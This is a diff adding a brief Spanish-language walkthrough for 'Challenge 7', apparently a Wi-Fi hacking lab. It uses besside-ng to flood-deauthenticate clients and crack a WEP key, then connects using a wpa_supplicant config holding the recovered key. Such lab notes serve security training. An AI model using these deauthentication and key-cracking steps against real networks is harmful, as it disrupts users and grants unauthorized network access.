@@ -1,0 +1,21 @@
+CHALLENGE 7
+============================================================
+hacemos el comando besside-ng -b MAC wlan0mon -> Crackeamos la contraseña con un ataque de floody, desconectando a todo el mundo para que al conectarse capturar la clave
+
+mkdir carpeta
+cd carpeta
+nano wifi-old.conf -> Creamos un archivo de configuración
+
+-----
+network={
+	ssid="wifi-old"
+	key_mgmt=NONE
+	wep_key0=11bb33cd55 -> Contraseña sin los :
+	wep_tx_keyidx=0
+}
+----
+
+wpa_supplicant -Dnl80211 -iwlan1 -c wifi-old.conf -> Conectarnos al wifi
+dhclient wlan1 -v -> Pedir IP al wifi para poder usarla
+============================================================
+
